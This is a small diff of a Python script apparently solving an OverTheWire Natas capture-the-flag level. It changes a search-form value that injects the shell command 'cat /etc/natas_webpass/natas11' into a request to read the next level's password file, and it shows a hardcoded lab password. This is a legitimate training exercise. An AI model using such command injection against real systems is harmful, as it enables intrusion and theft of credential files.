@@ -6,7 +6,7 @@ password = "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv"
 
 url = 'http://%s.natas.labs.overthewire.org' % username
 
-data={"needle":". cat /etc/natas_webpass/natas10 #","submit":"Search"}
+data={"needle":". cat /etc/natas_webpass/natas11 #","submit":"Search"}
 
 session = requests.Session() #Maintains a session
 #response = session.get(url , auth=(username, password))
